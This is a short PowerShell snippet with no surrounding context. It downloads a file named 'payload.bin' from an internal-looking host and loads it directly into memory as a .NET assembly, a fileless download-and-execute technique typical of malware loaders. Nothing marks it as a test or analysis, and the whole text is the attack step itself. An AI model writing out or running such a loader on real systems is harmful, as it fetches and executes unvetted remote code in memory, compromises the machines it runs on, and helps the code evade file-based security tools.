
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData('http://internal.corp/payload.bin')
[Reflection.Assembly]::Load($ManagedBytes)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
